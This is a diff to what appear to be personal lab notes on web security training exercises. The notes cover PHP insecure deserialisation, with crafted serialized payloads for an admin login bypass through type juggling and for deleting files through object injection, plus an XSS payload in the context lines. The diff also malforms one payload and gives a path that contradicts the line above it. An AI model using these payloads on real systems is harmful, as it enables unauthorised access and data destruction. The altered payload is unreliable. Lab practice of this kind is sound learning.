@@ -47,15 +47,20 @@ src="https://lab_id.web-security-academy.net/feedback?name=<img src=1 onerror=pr
 ```
 ---
 ## Insecure Deserialisation Vulnerabilities
+- ==Modifying serialized data types==
+  The key here is that in PHP 7.xand earlier, `0=="any string"` is true, meaning that if it takes a 0 value, it can bypass any validation that relies on comparing a string, e.g. password or token. 
+  Send this payload:
+  O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+
 - ==Using application functionality to exploit insecure deserialization==
   Delete account function has an avatar_link attribute which is a file path. 
   Modify the file path to be /home/carlos/morale.txt
   O:4:"User":3:{s:8:"username";s:5:"gregg";s:12:"access_token";s:32:"gc03tv3pzs5h5kabc2eeowm9lnng69iy";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
 - ==Arbitrary object injection in PHP==
   Use Burp Sitemap to find there is a /lib/CustomTemplate.php, which can be viewed by adding a Tilde, e.g.:
-  https://lab_id.web-security-academy.net/lib/CustomTemplate.php~
+  https://lab_id.web-security-academy.net/libs/CustomTemplate.php~
   Create this class by sending it as a seriliased object with the file path as /home/carlos/morale.txt:
-  O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
+  O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt"}
   Send this for the magic method to be automatically invoked and delete Carlos's file.
 - ==Exploiting Java deserialization with Apache Commons==
   Download ysoserial-all.jar 
